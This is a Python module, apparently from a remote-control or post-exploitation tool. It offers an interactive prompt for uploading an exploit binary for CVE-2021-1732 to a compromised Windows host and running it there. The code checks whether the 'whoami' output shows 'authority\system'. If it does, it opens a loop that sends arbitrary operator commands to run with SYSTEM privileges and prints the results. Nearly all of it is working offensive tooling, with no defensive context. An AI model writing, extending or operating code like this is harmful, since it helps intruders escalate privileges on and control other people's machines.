import struct
from AuxiliaryFunctions import uploadCVE
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI


def CVE_2021_1732(conn):
    commands = ["exit", "upload CVE_2021_1732.exe", "exploit"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;1;1mCVE-2021-1732 > \033[0m')
    print('\033[1;32;32m' + "[*] Firstly, please upload CVE_2021_1732.exe" + '\033[0m')
    while True:
        command1 = prompt(formatted_text1, completer=completer)
        if command1 == "":
            continue
        elif command1.split()[0] == 'upload':
            uploadCVE.uploadCVE(conn, command1)
            continue
        elif command1 == 'exit':
            break
        elif command1 == 'exploit':
            print('\033[1;31;31m' + "[!] Exploiting......" + '\033[0m')
            command = "CVE_2021_1732.exe \"whoami\""
            myresult = ""
            conn.sendall(command.encode("gbk"))
            result_len = conn.recv(4)
            real_len = struct.unpack("i", result_len)[0]
            while True:
                if 1024 < real_len:
                    result = conn.recv(1024).decode("gbk", errors="ignore")
                    myresult = myresult + result
                    print(result)
                    real_len = real_len - 1024
                    continue
                else:
                    result = conn.recv(1024).decode("gbk", errors="ignore")
                    print(result)
                    myresult = myresult + result
                    break
            print('\033[1;34;34m' + "[+] Done!" + '\033[0m')
            if "authority\\system" in myresult:
                print('\033[1;32;32m' + "[+] Successfully elevated rights to the system." + '\033[0m')
                while True:
                    try:
                        system_command = input('\033[1;32;32m' + "system > " + '\033[0m')
                        if system_command == 'exit':
                            break
                        elif system_command == "":
                            continue
                        else:
                            command = 'CVE_2021_1732.exe "{}"'.format(system_command)
                            conn.sendall(command.encode("gbk"))
                            result_len = conn.recv(4)
                            real_len = struct.unpack("i", result_len)[0]
                            while True:
                                if 1024 < real_len:
                                    result = conn.recv(1024).decode("gbk", errors="ignore")
                                    print('\033[1;1;1m' + result + '\033[0m')
                                    real_len = real_len - 1024
                                    continue
                                else:
                                    result = conn.recv(1024).decode("gbk", errors="ignore")
                                    print('\033[1;1;1m' + result + '\033[0m')
                                    break
                    except KeyboardInterrupt:
                        print('\033[1;1;1m' + "Exiting......" + '\033[0m')
                        break
                    except:
                        print('\033[1;31;31m' + "[-] Something error!" + '\033[0m')
                        continue
                break
            else:
                print('\033[1;31;31m' + "[-] Failed to raise rights." + '\033[0m')
                break
        else:
            continue
